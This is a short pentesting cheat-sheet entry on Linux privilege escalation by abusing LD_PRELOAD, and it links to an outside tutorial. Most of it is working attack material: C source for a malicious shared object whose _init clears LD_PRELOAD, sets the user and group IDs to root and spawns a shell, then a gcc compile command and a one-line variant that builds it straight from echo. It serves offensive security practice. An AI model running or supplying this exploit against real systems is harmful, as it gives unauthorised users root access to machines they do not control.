# Privilege Escalation

## LD_PRELOAD

If you have the ability to tamper with LD_PRELOAD environment variable you can create a malicious shared object and load it.
- [Linux Privilege Escalation using LD_Preload](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload)

Verbose:
```bash
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

Compile and use
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```


1 liner:
```bash
echo $'#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\nvoid _init() { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash -p"); }' | gcc -fPIC -shared -o pe.so -nostartfiles -x c -
```